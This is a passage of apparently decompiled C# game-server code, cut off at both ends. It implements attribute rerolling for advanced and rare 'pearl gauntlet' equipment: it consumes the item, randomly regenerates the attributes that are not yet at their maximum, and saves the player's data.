						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠护手稀有属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠护手稀有属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
